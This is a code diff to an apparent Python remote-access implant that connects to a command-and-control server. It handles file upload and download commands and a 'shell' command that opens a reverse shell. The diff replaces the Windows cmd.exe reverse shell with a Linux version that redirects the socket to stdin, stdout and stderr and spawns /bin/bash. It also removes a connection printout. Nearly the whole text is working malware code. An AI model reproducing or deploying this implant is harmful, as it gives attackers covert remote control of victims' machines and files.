@@ -1,4 +1,4 @@
-import socket, os, threading, subprocess, json
+import socket, os, pty, threading, subprocess, json
 
 HOST = "127.0.0.1" # C2 Server IP
 PORT = 6969 # C2 application port
@@ -11,13 +11,13 @@ def send_data(conn, data):
 
 def download_data(path):
     """Function for the data download"""
-    if os.path.isfile(path):
+    if not os.path.isfile(path):
         return '0'
     try:
         f = open(path)
         data = f.read()
     except OSError as e:
-        return str(e)
+        return '1'
     return data
 
 def upload_data(data, path):
@@ -33,7 +33,6 @@ def upload_data(data, path):
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.connect((HOST, PORT)) # Connect to the C2 server
-    print("Connected!!!")
     while True:
         try:
             data = json.loads(sock.recv(1024).decode())
@@ -43,12 +42,13 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             quit()
         match data[0]:
             case "shell": # Opens a reverse shell on the host to the server
-                p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-                s=socket.socket()
-                s.connect((HOST, data[1])) # Connecting to the server with a shell channel
-                threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start() # Starting a thread to read console output
-                threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start() # Starting a thread to input commands from server
-            
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((HOST, data[1]))
+                os.dup2(s.fileno(),0)
+                os.dup2(s.fileno(),1)
+                os.dup2(s.fileno(),2)
+                pty.spawn("/bin/bash")
+
             case 'upload': # Sending a file from the server to the target
                 ret = upload_data(data[1], data[2])
                 try:
